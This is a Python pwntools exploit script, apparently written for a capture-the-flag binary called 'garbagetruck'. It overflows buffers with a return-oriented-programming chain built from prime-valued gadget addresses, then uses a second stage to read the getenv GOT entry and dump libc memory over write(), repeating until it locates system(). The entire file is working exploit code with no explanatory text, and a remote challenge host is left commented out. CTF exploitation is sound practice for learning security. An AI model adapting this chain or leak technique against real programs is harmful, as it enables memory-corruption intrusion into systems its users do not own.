from pwn import *
import pickle

try:
	f = open("lookup.pckl")
	pims = pickle.load(f)
	ropaddr = pims[0x100]
except:
	print "No cache, doing it manually"
	def isPrime(Number):
	    return 2 in [Number,2**Number%Number]

	pims = {}
	for i in xrange(0x100):
		pims[i] = None

	print "Finding prime bytes"
	for i in xrange(0x0756000+0x77, 0x0075c000):
		# adding 77 because rax has to be writeable
		b = i & 0xff
		if pims[b] is None:
			if isPrime(i):
				pims[b] = [i,]
				print "Found [%x] => %x, %d to go" % (b, i, pims.values().count(None))
		b = (b+0x39) & 0xff
		if pims[b] is None:
			if isPrime(i):
				# the second gadget will add 0x39 to al
				pims[b] = [i,0x4a1a1f]
				print "Found [%x] => %x, %d to go" % (b, i, pims.values().count(None))
		
		if None not in pims.values():
			break
		
	print "Calcing stage 2 addr"
	for i in xrange(i+1, 0x0075c000):
		#continue past the stuff we may screw up
		if isPrime(i):
			ropaddr = i
			break
	pims[0x100] = ropaddr
	pickle.dump(pims, open("lookup.pckl",'w'))
	exit(0)

print "Stage 2 addr %x" % ropaddr
thrown = 0
while 1:
	rop1 = []

	existing = open("libc").read()

	rop2 = [
		0x000000000041a318, #: pop rax; ret;
		0x756020-0x10, # getenv_got
		0x0000000000421db3, #: mov rax, qword ptr [rax + 0x10]; ret;


		0x00000000004aaae9, #: pop rdi; ret;
		u64(p64(len(existing)-0x10)), #offset on my libc

		0x00000000004070ef, #: add rax, rdi; ret;

		0x0000000000407c2d, #: push rax; pop rbx; ret;
		#makes rax=pop rax for the call
		0x000000000041a318, #: pop rax; ret;
		0x000000000041a318, #: pop rax; ret;

		0x000000000046d1f2, #: mov rsi, rbx; call rax;

		0x00000000004aaae9, #: pop rdi; ret;
		1,

		0x00000000004f67f5, #pop rdx; ret;
		0x3c0000, 

		0x401826 # write
		]

	rop2b = "".join([p64(i) for i in rop2])

	#set zero flag
	rop1.append(0x000000000048c76f) #: xor eax, eax; ret;
	rop1.append(0x00000000004faa77) #: pop rcx; jne 0xfaad8; ret;
	rop1.append(ropaddr) 
	rop1.append(0x0000000000402659)#: pop rbx; ret;
	rop1.append(0x0000000000401ff3)

	print "Stage 1 len: %d bytes" % len(rop2b)
	old_b = None
	for b in rop2b:
		if old_b != b:
			rop1.append(0x00000000004b2303)#: pop rax; or byte ptr [rax - 0x77], cl; ret;
			rop1 += pims[ord(b)]
			old_b = b
		rop1.append(0x000000000046e1bd)#: movsxd rdx, eax; call rbx;
		#rop1.append(0x0000000000401ff3)#: mov qword ptr [rcx], rdx; add rsp, 8; pop rbx; pop rbp; ret;
		#rop1.append(0x4141414141441414)
		rop1.append(0x0000000000401ff3)
		rop1.append(ropaddr)
		rop1.append(0x00000000004b9341)#: inc ecx; ret;

	#yank off that last inc
	rop1.pop()

	rop1.append(0x00000000004061dd)#: pop rsp; ret;
	rop1.append(ropaddr)

	print "Rop chain created. Total Len: %x primes" % len(rop1)
	s = process("garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65")
	#s = remote("garbagetruck.chal.pwning.xxx",6349)

	for i in xrange(27):
		#overflow buffers
		s.sendline("3")

	for g in rop1:
		s.sendline("%d" % g)

	s.clean()
	s.sendline("0")

	try:
		s.readline()
	except:
		continue
	s.readline()
	s.readline()
	buf = s.recv(0x3c0000)
	print "Total len %x, thrown away %x" % (len(existing), thrown)
	try: 
		c = existing.count(buf[:16])
		print "found start %d times" % c
		for i in xrange(c):
			off = existing.index(buf[:16])
		print "Got more %x bytes!" % len(buf)

		n = existing[:off]+buf
		open("libc", 'w').write(n)
		print "wrote %x" % (len(n))
		if p64(0xfa86e90b74ff8548) in n:
			print "FOUND SYSTEM! = %x" %(n.index(p64(0xfa86e90b74ff8548)))
			break
	except:
		print repr(existing[-20:])
		print repr(buf[:20])
		open("libc", 'w').write(existing[:-0x100])
		thrown += 0x100
